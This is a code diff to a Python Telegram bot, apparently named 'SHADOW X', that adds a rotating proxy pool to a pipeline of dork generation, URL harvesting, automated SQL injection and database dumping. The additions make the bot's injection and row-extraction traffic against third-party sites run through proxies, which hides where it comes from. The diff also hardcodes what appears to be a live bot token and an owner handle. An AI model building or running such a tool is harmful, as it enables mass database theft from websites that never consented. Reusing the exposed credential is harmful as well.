@@ -69,10 +69,16 @@ def _load_cfg() -> dict:
 
 
 CFG = _load_cfg()
-TOKEN = (os.environ.get("SHADOW_TOKEN") or CFG.get("token") or "").strip()
+
+# ── defaults (config file / env inhe override kar sakta hai) ────────────────
+DEFAULT_TOKEN = "8897685033:AAEDffs29JBrS1VYyl5ao9wWFrh64Tgscz8"
+DEFAULT_ADMINS = [8937044612]          # @Bloody_sweet_baby — baad me badal sakte ho
+OWNER_USERNAME = "@Bloody_sweet_baby"
+
+TOKEN = (os.environ.get("SHADOW_TOKEN") or CFG.get("token") or DEFAULT_TOKEN).strip()
 ADMINS = [int(x) for x in (CFG.get("admins") or []) if str(x).isdigit()]
 if not ADMINS:
-    ADMINS = [8999053405]
+    ADMINS = list(DEFAULT_ADMINS)
 
 NO_RUN = os.environ.get("SHADOW_NO_RUN") == "1"
 if "PUT_YOUR" in TOKEN or not TOKEN or ":" not in TOKEN:
@@ -464,16 +470,100 @@ def param_of(raw: str) -> str:
         return ""
 
 
-async def fetch(session, url, timeout=8, headers=None, data=None, method="GET"):
+# ══════════════════════════════════════════════════════════════════════════════
+#  🧅 PROXY ENGINE — pool + rotating (sab requests isse guzarti hain)
+# ══════════════════════════════════════════════════════════════════════════════
+PROXY = {"pool": [], "rot": "", "on": True, "rr": 0, "ok": 0, "bad": 0}
+PROXY_LOCK = threading.RLock()
+
+
+def proxy_enabled() -> bool:
     try:
-        kw = dict(timeout=aiohttp.ClientTimeout(total=timeout), ssl=False,
-                  allow_redirects=True,
-                  headers={"User-Agent": UA, "Accept": "*/*", **(headers or {})})
-        async with session.request(method, url, data=data, **kw) as r:
-            body = await r.text(errors="ignore")
-            return {"status": r.status, "headers": dict(r.headers), "body": body}
-    except Exception as e:
-        return {"status": 0, "headers": {}, "body": "", "err": str(e)[:80]}
+        return str(sget("proxy_on", 1)).lower() in ("1", "true", "on", "yes")
+    except Exception:
+        return True
+
+
+def proxies_of(uid) -> list:
+    """User ke apne proxies + admin ka global pool (duplicate hate hue)."""
+    mine = list((jload("proxies", {}) or {}).get(str(uid)) or [])
+    glob = list(sget("global_proxies", []) or [])
+    out, seen = [], set()
+    for p in mine + glob:
+        p = str(p or "").strip()
+        if p and p not in seen:
+            seen.add(p)
+            out.append(p)
+    return out
+
+
+def proxy_pick():
+    """Round-robin — rot ho to wahi, warna pool se ek."""
+    if not PROXY["on"]:
+        return None
+    if PROXY["rot"]:
+        return PROXY["rot"]
+    pool = PROXY["pool"]
+    if not pool:
+        return None
+    with PROXY_LOCK:
+        PROXY["rr"] = (PROXY["rr"] + 1) % len(pool)
+        return pool[PROXY["rr"]]
+
+
+def proxy_setup(uid) -> dict:
+    """Har run se pehle — us user ke proxies activate karo."""
+    on = proxy_enabled()
+    pool = proxies_of(uid) if on else []
+    rot = str(sget("rotproxy", "") or "").strip() if on else ""
+    with PROXY_LOCK:
+        PROXY.update({"pool": pool, "rot": rot, "on": on, "rr": 0, "ok": 0, "bad": 0})
+    return proxy_info()
+
+
+def proxy_stop():
+    with PROXY_LOCK:
+        PROXY.update({"pool": [], "rot": "", "rr": 0})
+
+
+def px_line(px) -> str:
+    """Screen me proxy status ki ek line."""
+    if not px or not (px.get("pool") or px.get("rot")):
+        return ""
+    return ("\n🧅 Proxies: <code>%s</code>" % px.get("pool", 0)) + (" 🌀 rot" if px.get("rot") else "")
+
+
+def proxy_info() -> dict:
+    with PROXY_LOCK:
+        return {"on": PROXY["on"], "pool": len(PROXY["pool"]), "rot": bool(PROXY["rot"]),
+                "ok": PROXY["ok"], "bad": PROXY["bad"]}
+
+
+async def fetch(session, url, timeout=8, headers=None, data=None, method="GET",
+                proxy="auto"):
+    """proxy="auto" → pool/rotating se; None → direct; string → wahi proxy."""
+    kw = dict(timeout=aiohttp.ClientTimeout(total=timeout), ssl=False,
+              allow_redirects=True,
+              headers={"User-Agent": UA, "Accept": "*/*", **(headers or {})})
+    first = proxy_pick() if proxy == "auto" else proxy
+    tries = [first, None] if first else [None]
+    last = {"status": 0, "headers": {}, "body": "", "err": "no route"}
+    for px in tries:
+        try:
+            async with session.request(method, url, data=data, proxy=px, **kw) as r:
+                body = await r.text(errors="ignore")
+                if px:
+                    with PROXY_LOCK:
+                        PROXY["ok"] += 1
+                return {"status": r.status, "headers": dict(r.headers), "body": body,
+                        "proxy": px or ""}
+        except Exception as e:
+            last = {"status": 0, "headers": {}, "body": "", "err": str(e)[:80]}
+            if px:
+                with PROXY_LOCK:
+                    PROXY["bad"] += 1
+            continue
+    return last
 
 
 def dbms_of(body: str) -> str:
@@ -787,6 +877,37 @@ def norm_proxy(s: str):
     return f"http://{m.group(1)}:{m.group(2)}" if m else None
 
 
+def proxy_add_lines(uid, lines, check=False) -> tuple:
+    """Text lines → valid proxies. check=True par live filter (slow)."""
+    prox, bad = [], 0
+    for ln in lines:
+        x = norm_proxy(ln)
+        if x:
+            prox.append(x)
+        elif str(ln or "").strip():
+            bad += 1
+    prox = uniq(prox)
+    if check and prox:
+        prox = asyncio.run(proxy_check(prox))
+    d = jload("proxies", {}) or {}
+    old = d.get(str(uid)) or []
+    d[str(uid)] = uniq(old + prox)[:5000]
+    jsave("proxies", d)
+    return prox, bad
+
+
+def proxy_clean(uid) -> tuple:
+    """Saved pool ko check karke dead nikaal do."""
+    pool = list((jload("proxies", {}) or {}).get(str(uid)) or [])
+    if not pool:
+        return [], 0
+    live = asyncio.run(proxy_check(pool))
+    d = jload("proxies", {}) or {}
+    d[str(uid)] = live
+    jsave("proxies", d)
+    return live, len(pool) - len(live)
+
+
 def proxy_hunt(limit=800):
     import urllib.request
     raw = []
@@ -1049,7 +1170,10 @@ def main_text(uid) -> str:
             + f"👤 <b>@{esc(u.get('username') or 'user')}</b>\n"
             + KV("Plan", f"<code>{left}</code>", "🎫") + "\n"
             + KV("Parser URLs", f"<code>{fmt(len(u.get('last_urls') or []))}</code>", "🔗") + "\n"
-            + KV("Vulns", f"<code>{fmt(len(u.get('last_vulns') or []))}</code>", "💉") + "\n\n"
+            + KV("Vulns", f"<code>{fmt(len(u.get('last_vulns') or []))}</code>", "💉") + "\n"
+            + KV("Proxies", f"<code>{fmt(len(proxies_of(uid)))}</code>"
+                 + (" 🌀" if sget("rotproxy") else "")
+                 + ("" if proxy_enabled() else " ⚪"), "🧅") + "\n\n"
             + P("Pipeline: keywords → dorks → parser → injector → dumper"))
 
 
@@ -1122,6 +1246,27 @@ def screen_inj(chat_id):
     wait_for(chat_id, "inj_urls")
 
 
+def screen_proxy(chat_id, uid):
+    mine = len((jload("proxies", {}) or {}).get(str(uid)) or [])
+    glob = len(sget("global_proxies", []) or [])
+    rot = str(sget("rotproxy", "") or "")
+    on = proxy_enabled()
+    send(chat_id, H("PROXY MANAGER", "pool + rotating") + "\n\n"
+         + KV("Meri proxy", f"<code>{fmt(mine)}</code>", "🧅") + "\n"
+         + KV("Global pool", f"<code>{fmt(glob)}</code>", "🌐") + "\n"
+         + KV("Proxy use", ("✅ ON" if on else "⚪ OFF"), "⚙️") + "\n"
+         + KV("Rotating", ("✅ " + esc(rot.split("@")[-1][:32])) if rot else "⚪ OFF", "🌀") + "\n\n"
+         + P("Parser / Injector / Dumper — sab isi pool se chalte hain.\n"
+             "Dead proxy par request direct retry ho jaati hai."),
+         kb([[sbtn("➕ ADD PROXIES", "proxy:add", "success"),
+              sbtn("✅ CHECK MINE", "proxy:mine", "success")],
+             [sbtn("📋 LIST", "proxy:list"), sbtn("🧹 CLEAN", "proxy:clean", "danger")],
+             [sbtn("⚡ HUNT 500", "proxy:hunt", "success"),
+              sbtn("🌀 ROTATING", "proxy:rot")],
+             [sbtn("⚙️ USE " + ("ON" if on else "OFF"), "proxy:toggle"),
+              sbtn("⬅️ BACK", "home")]]))
+
+
 def screen_dump(chat_id):
     send(chat_id, H("DUMPER", "DB se ASLI rows") + "\n\n"
          + KV("Tables / URL", f"<code>{sget('dump_tables', 8)}</code>", "🗃") + "\n"
@@ -1149,8 +1294,9 @@ def screen_cfg(chat_id):
 # ══════════════════════════════════════════════════════════════════════════════
 def run_parse(chat_id, uid, dorks, tid):
     def work():
+        px = proxy_setup(uid)
         msg = send(chat_id, H("PARSER", "running") + "\n\n"
-                   + f"🧬 Dorks: <code>{fmt(len(dorks))}</code>", stop_kb(tid))
+                   + f"🧬 Dorks: <code>{fmt(len(dorks))}</code>" + px_line(px), stop_kb(tid))
         last = {"t": 0.0}
 
         async def prog(done, total, found):
@@ -1200,8 +1346,9 @@ def run_parse(chat_id, uid, dorks, tid):
 
 def run_inject(chat_id, uid, urls, tid):
     def work():
+        px = proxy_setup(uid)
         msg = send(chat_id, H("INJECTOR", "running") + "\n\n"
-                   + f"🔗 URLs: <code>{fmt(len(urls))}</code>", stop_kb(tid))
+                   + f"🔗 URLs: <code>{fmt(len(urls))}</code>" + px_line(px), stop_kb(tid))
         last = {"t": 0.0}
 
         async def prog(done, total, vulns):
@@ -1257,8 +1404,9 @@ def run_inject(chat_id, uid, urls, tid):
 
 def run_dump(chat_id, uid, urls, tid):
     def work():
+        px = proxy_setup(uid)
         msg = send(chat_id, H("DUMPER", "extracting") + "\n\n"
-                   + f"🔗 Targets: <code>{fmt(len(urls))}</code>", stop_kb(tid))
+                   + f"🔗 Targets: <code>{fmt(len(urls))}</code>" + px_line(px), stop_kb(tid))
         results = []
 
         async def work_async():
@@ -1424,7 +1572,8 @@ def run_pipeline(chat_id, uid):
     tid = task_new(uid, "pipeline", 3, "Full pipeline")
 
     def work():
-        msg = send(chat_id, H("PIPELINE", "step 1/3 — dorks"), stop_kb(tid))
+        px = proxy_setup(uid)
+        msg = send(chat_id, H("PIPELINE", "step 1/3 — dorks") + px_line(px), stop_kb(tid))
         dorks = gen_dorks(int(sget("pipe_dorks", 400)))
         if msg:
             edit(chat_id, msg.message_id, H("PIPELINE", "step 2/3 — parser") + "\n\n"
@@ -1563,10 +1712,75 @@ def on_cb(call):
         wait_for(uid, "subs_dom")
         return
     if data == "proxy":
-        send(chat, H("PROXIES", "hunt + check") + "\n\n"
-             + KV("Saved", f"<code>{fmt(len(jload('proxies', {}).get(str(uid), [])))}</code>", "🧅"),
-             kb([[sbtn("⚡ HUNT", "proxy:hunt", "success"), sbtn("✅ CHECK", "proxy:check")],
-                 [sbtn("⬅️ BACK", "home")]]))
+        screen_proxy(chat, uid)
+        return
+    if data == "proxy:add":
+        send(chat, H("ADD PROXIES", "any format") + "\n\n"
+             + P("Ek line me ek proxy. Ye formats chalte hain:") + "\n\n"
+             + "<code>http://user:pass@host:port\nhost:port\nuser:pass@host:port\n"
+               "socks5://host:port</code>", back_kb("proxy"))
+        wait_for(uid, "proxy_add")
+        return
+    if data == "proxy:mine":
+        pool = list((jload("proxies", {}) or {}).get(str(uid)) or [])
+        if not pool:
+            send(chat, "😕 Pehle ➕ ADD PROXIES se proxy daalo.", back_kb("proxy"))
+            return
+
+        def chk():
+            send(chat, f"🧅 {len(pool)} proxies check ho rahi hain…")
+            live, dead = proxy_clean(uid)
+            send(chat, H("PROXY CHECK") + f"\n\n🟢 Live: <code>{len(live)}</code>\n"
+                 f"💀 Dead: <code>{dead}</code>", back_kb("proxy"))
+        threading.Thread(target=chk, daemon=True).start()
+        return
+    if data == "proxy:clean":
+        pool = list((jload("proxies", {}) or {}).get(str(uid)) or [])
+        if not pool:
+            send(chat, "😕 Pool khali hai.", back_kb("proxy"))
+            return
+
+        def clean():
+            send(chat, f"🧹 {len(pool)} proxies clean ho rahi hain…")
+            live, dead = proxy_clean(uid)
+            send(chat, H("PROXY CLEAN") + f"\n\n🟢 Bachi: <code>{len(live)}</code>\n"
+                 f"🗑 Hatayi: <code>{dead}</code>", back_kb("proxy"))
+        threading.Thread(target=clean, daemon=True).start()
+        return
+    if data == "proxy:list":
+        pool = list((jload("proxies", {}) or {}).get(str(uid)) or [])
+        if not pool:
+            send(chat, "😕 Pool khali hai.", back_kb("proxy"))
+            return
+        body = H("MY PROXIES", f"{len(pool)} saved") + "\n\n<code>" + \
+               "\n".join(esc(x) for x in pool[:40]) + "</code>"
+        if len(pool) > 40:
+            body += f"\n\n<i>… +{len(pool) - 40} more</i>"
+        send(chat, body, kb([[sbtn("📤 SEND FILE", "proxy:file", "success")],
+                             [sbtn("⬅️ BACK", "proxy")]]))
+        return
+    if data == "proxy:file":
+        pool = list((jload("proxies", {}) or {}).get(str(uid)) or [])
+        if not pool:
+            send(chat, "😕 Pool khali hai.", back_kb("proxy"))
+            return
+        path = write_file(pool, "proxies", f"SHADOW X — {len(pool)} proxies")
+        send_file(chat, path, f"🧅 {len(pool)} proxies")
+        return
+    if data == "proxy:toggle":
+        v = 0 if proxy_enabled() else 1
+        sset("proxy_on", v)
+        send(chat, f"⚙️ Proxy use: <b>{'ON' if v else 'OFF'}</b>", back_kb("proxy"))
+        return
+    if data == "proxy:rot":
+        if not is_admin(uid):
+            answer(call, "Admin only", True)
+            return
+        send(chat, H("ROTATING PROXY", "admin") + "\n\n"
+             + P("Ek endpoint jo har request pe IP badle (ya http proxy).") + "\n\n"
+             + "<code>http://user:pass@host:port</code>\n\n"
+             + P("Band karna ho to <code>off</code> likho."), back_kb("proxy"))
+        wait_for(uid, "proxy_rot")
         return
     if data == "proxy:hunt":
         def hunt():
@@ -1783,6 +1997,7 @@ def on_input(msg):
         tid = task_new(uid, "qc", len(urls), "QC")
 
         def work():
+            proxy_setup(uid)
             res = asyncio.run(qc_urls(urls, uid, tid))
             task_upd(tid, status="done")
             top = [f"{u} | {s} | {n} | {st}" for u, s, n, st in res]
@@ -1825,6 +2040,47 @@ def on_input(msg):
             send_file(chat, path, f"🕸 {len(names)} subdomains")
             send(chat, H("SUBFINDER — DONE") + f"\n\n🕸 <code>{len(names)}</code>", back_kb())
         threading.Thread(target=work, daemon=True).start()
+        return
+
+    if key == "proxy_add":
+        prox, bad = proxy_add_lines(uid, lines)
+        if not prox:
+            send(chat, "❌ Koi valid proxy nahi mila. Format: <code>host:port</code> "
+                       "ya <code>http://user:pass@host:port</code>", back_kb("proxy"))
+            return
+        total = len((jload("proxies", {}) or {}).get(str(uid)) or [])
+        send(chat, H("PROXIES ADDED") + f"\n\n✅ Naye: <code>{len(prox)}</code>\n"
+             f"🧅 Total: <code>{total}</code>" + (f"\n⚠️ Invalid: <code>{bad}</code>" if bad else "")
+             + "\n\n" + P("Ab ✅ CHECK MINE dabao — live/ dead pata chalega."),
+             kb([[sbtn("✅ CHECK MINE", "proxy:mine", "success")],
+                 [sbtn("⬅️ PROXY", "proxy")]]))
+        return
+
+    if key == "proxy_rot":
+        if not is_admin(uid):
+            return
+        if text.lower() in ("off", "0", "band", "no"):
+            sset("rotproxy", "")
+            send(chat, "🌀 Rotating proxy: <b>OFF</b>", back_kb("proxy"))
+            return
+        px = norm_proxy(text)
+        if not px:
+            send(chat, "❌ Format galat. Example: <code>http://user:pass@host:port</code>",
+                 back_kb("proxy"))
+            return
+
+        def chk():
+            live = asyncio.run(proxy_check([px], threads=1))
+            if live:
+                sset("rotproxy", px)
+                send(chat, H("ROTATING PROXY", "saved") + f"\n\n🌀 <code>{esc(px)}</code>\n"
+                     + P("Ab har request isi se jayegi."), back_kb("proxy"))
+            else:
+                sset("rotproxy", px)
+                send(chat, H("ROTATING PROXY", "save + warning") + f"\n\n🌀 <code>{esc(px)}</code>\n\n"
+                     + P("⚠️ Check fail — phir bhi save kiya. Agar dead nikla to requests "
+                         "direct retry ho jayengi."), back_kb("proxy"))
+        threading.Thread(target=chk, daemon=True).start()
         return
 
     if key == "proxy_check":
@@ -1901,7 +2157,10 @@ def cmd_start(msg):
 def cmd_ping(msg):
     send(msg.chat.id, H("PONG") + f"\n\n📦 <b>{VERSION}</b> · build <code>{BUILD}</code>\n"
          f"⏱ Uptime: <code>{int(time.time() - START_TS)}s</code>\n"
-         f"🧵 Tasks: <code>{sum(1 for t in TASKS.values() if t.get('status') == 'running')}</code>")
+         f"🧵 Tasks: <code>{sum(1 for t in TASKS.values() if t.get('status') == 'running')}</code>\n"
+         f"🧅 Proxies: <code>{len(PROXY['pool'])}</code>"
+         + (" 🌀" if PROXY["rot"] else "") + "\n"
+         f"👑 Admins: <code>{', '.join(str(x) for x in ADMINS)}</code>")
 
 
 @bot.message_handler(commands=["help"])
@@ -1914,7 +2173,9 @@ def cmd_help(msg):
          "🌐 <b>PARSER</b> — 10 engines se URLs\n"
          "💉 <b>INJECTOR</b> — error/boolean/time SQLi\n"
          "📥 <b>DUMPER</b> — DB tables + rows\n"
-         "🎯 <b>QC</b> · 🛡 <b>WAF LAB</b> · 🕸 <b>SUBFINDER</b>\n\n"
+         "🎯 <b>QC</b> · 🛡 <b>WAF LAB</b> · 🕸 <b>SUBFINDER</b>\n"
+         "🧅 <b>PROXIES</b> — pool + rotating (/proxy)\n"
+         "🐍 <b>SQLMAP</b> — optional dump engine (/sqlmap)\n\n"
          "/ping · /admin · /stop · /id", back_kb())
 
 
@@ -1931,6 +2192,12 @@ def cmd_admin(msg):
         send(msg.chat.id, "⛔ Admin only.")
         return
     admin_screen(msg.chat.id)
+
+
+@bot.message_handler(commands=["proxy", "proxies"])
+@safe
+def cmd_proxy(msg):
+    screen_proxy(msg.chat.id, msg.from_user.id)
 
 
 @bot.message_handler(commands=["sqlmap"])
